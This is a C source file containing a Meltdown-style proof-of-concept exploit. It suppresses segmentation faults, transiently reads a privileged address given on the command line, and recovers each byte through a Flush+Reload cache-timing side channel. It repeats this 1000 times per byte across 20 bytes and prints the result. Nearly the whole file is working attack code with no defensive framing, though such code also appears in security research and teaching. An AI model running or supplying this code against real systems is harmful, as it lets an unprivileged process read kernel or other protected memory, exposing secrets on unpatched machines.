#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h> 
#include <unistd.h>
#include <fcntl.h>
#include <x86intrin.h>
#define pagesize 4096

jmp_buf jump;

static char volatile check[256*pagesize]={};

static void deal_segmentation(int sig){
    //printf("recieve segmentation\n");
    (void)sig;
    siglongjmp(jump,1);
}

static inline void maccess(void *p) {
  asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
}

int get_time(volatile char *addr){
    unsigned long long  time1,time2;
    int tmp=0;
    time1 = __rdtscp(&tmp);
    maccess(addr);
    time2 = __rdtscp(&tmp) - time1;
    return time2;
}

void flush(){
    int i;
    for (i=0;i<256;i++){
        _mm_clflush(&check[i*pagesize]);
    }    
}

int  reload(){
    int i,m;
    int volatile mix_i,min_i,min_time=2000,j,time;
    char *check_addr;
    for (i=0;i<256;i++){
        mix_i=((i * 167) + 13) & 255;
        check_addr=&check[pagesize*mix_i];
        time=get_time(check_addr);
        if (min_time > time){
            min_time=time;
            min_i=mix_i;
            j=i;
        }
    }
    return min_i;   
}

attack(char* addr)
{	
	//printf("speculate\n");
	if (!sigsetjmp(jump,1)){
	asm volatile (

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%rax\n\t"
        "shl $12, %%rax\n\t"
        "mov (%[target], %%rax, 1), %%rbx\n"
		:
		: [target] "r" (check),
		  [addr] "r" (addr)
		: "rax","rbx"
	);	
	}

}

int readbyte(int fd,char *addr){
       
    static char buf[256];
    memset(check, 1, sizeof(check));
    pread(fd, buf, sizeof(buf), 0);
    
    flush();
    //_mm_mfence();   
    attack(addr);

    return reload();
}

int max(int *score){
    int i,j;
    for (i=j=0;i<256;i++){
        if (score[i]>score[j]) j=i;
    }
    return j;
}

int main(int argc, const char* * argv){
    signal(SIGSEGV,deal_segmentation);
    int score[256]={};
    char* addr;
    int tmp,len=20;
    int fd = open("/proc/version", O_RDONLY);
    sscanf(argv[1],"%lx",&addr);
    printf("读取该地址：%lx后%d长度的内容\n",addr,len);
    for (int j=0;j<len;j++){
        memset(score,0,sizeof(score));
        for (int i=0;i<1000;i++){
            score[readbyte(fd,addr)]++;
        }
        tmp=max(score);
        printf("%d: %c\n",j,tmp,tmp);  
        addr++;      
    }
    
}